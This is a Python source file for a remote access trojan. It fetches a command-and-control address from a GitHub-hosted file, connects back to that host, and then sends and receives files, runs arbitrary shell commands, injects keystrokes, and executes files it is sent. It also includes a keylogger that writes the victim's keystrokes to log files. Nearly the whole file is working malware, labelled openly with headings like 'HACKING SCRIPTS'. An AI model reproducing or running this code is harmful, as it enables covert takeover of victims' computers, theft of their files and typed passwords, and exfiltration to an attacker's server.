import socket 
import threading 
import os , sys
import subprocess 
import time 
import pyautogui 
import requests 
import base64
from datetime import datetime
from pynput.keyboard import Listener



######################## connecting to server and other miscalleneous code ########################################

def server_ip(repo):
	r   = requests.get(f'https://api.github.com/repos/indrajith69/{repo}/contents/ip_address.txt?ref=master')
	req = bytes(r.json()['content'],encoding='utf-8')
	host,port=base64.decodebytes(req).decode('utf8').split(':')
	return host,int(port)

	
def reconnect():
	global client
	client.shutdown(socket.SHUT_WR)
	client.close()
	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	client.connect((HOST, PORT))



######################## connecting to server and other miscalleneous code ########################################
























############################# MESSING WITH THIER FILES! #############################################



def recv_b_file(name,size=1024):
	client.send(b's')
	with open(name,'wb') as f:
		file_contents = client.recv(size)
		while file_contents:
			f.write(file_contents)
			file_contents = client.recv(size)

	reconnect()


def send_b_file(path,size=1024):
	with open(path,'rb') as f:
		file_contents=f.read(size)
		while file_contents:
			client.send(file_contents)
			file_contents=f.read(size)

	print('done')
	reconnect()


def recv_t_file(name,size=1024):
	with open(name,'w') as f:
		file_contents = client.recv(size).decode('utf-8')
		while file_contents:
			if '~~exit~~' in file_contents:
				f.write(file_contents.replace('~~exit~~',''))
				break
			f.write(file_contents)
			file_contents = client.recv(size).decode('utf-8')


def send_t_file(path,size=1024):
	with open(path,'r') as f:
		file_contents = f.read(size)
		while file_contents:
			client.send(file_contents.encode('utf-8'))
			file_contents = f.read(size)
	client.send('~~exit~~'.encode('utf-8'))



############################# MESSING WITH THIER FILES! #############################################























########################## HACKING SCRIPTS ###########################################################


def keyboard(option,size=1024):
	if option==1:
		name = client.recv(size).decode('utf-8')
		recv_t_file(name)
		os.system(name)
		os.remove(name)

			


	elif option==2:
		while True:
			string = client.recv(size).decode('utf-8')
			if string=='exit':
				return

			else:
				for i in string:
					pyautogui.typewrite(i)







def keylogger(finish_time):
	string = ''
	file_name = str(datetime.today().date())+'.txt'
	path = os.path.join('logs',file_name)

	def write(key):
		nonlocal l,string
		key=str(key)
		with open(path,'a') as f:
			if datetime.now().minute >= finish_time:
				f.write(string+'\n')
				l.stop()
			else:
				if key=='Key.enter':
					f.write(string+'\n')
					string=''

				elif key=='Key.space':
					string+=' '
	
				elif 'Key' in key:
					string+='~'+key+'~'

				else:
					string+=key.replace("'","")

	with Listener(on_press=write) as l:
		if 'logs' not in os.listdir():
			os.mkdir('logs')
		l.join()
















########################## HACKING SCRIPTS ###########################################################




























def trojan():
	global client,HOST,PORT
	HOST,PORT = server_ip('server_address')
	#PORT=3889

	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	client.connect((HOST, PORT))

	while True:
		server_command = client.recv(1024).decode('utf-8')
		print(server_command)

		if server_command=='send binary file':
			name = client.recv(1024).decode('utf-8')
			recv_b_file(name,102400)

		elif server_command=='send text file':
			name = client.recv(1024).decode('utf-8')
			recv_t_file(name,102400)

		elif server_command=='recieve binary file':
			path = client.recv(1024).decode('utf-8')
			send_b_file(path,102400)

		elif server_command=='recieve text file':
			path = client.recv(1024).decode('utf-8')
			send_t_file(path,102400)







		elif server_command=='ls':
			output = ''
			for obj in os.listdir():
				output+=str(obj)+'\n'
			client.send(output.encode('utf-8'))

		elif server_command[:2]=='cd':
			os.chdir(server_command.split()[1])
			client.send(os.getcwd().encode('utf-8'))

		elif server_command=='pwd':
			client.send(os.getcwd().encode('utf-8'))

		elif server_command=='keyboard access':
			option=int(client.recv(1024).decode('utf-8'))
			keyboard(option)

		elif server_command=='exit':
			break

		else:
			p1=subprocess.run(server_command,shell=True,capture_output=True,text=True)
			client.send(p1.stdout.encode('utf-8'))
			#client.send('\ncommand was executed\n'.encode('utf-8'))








trojan()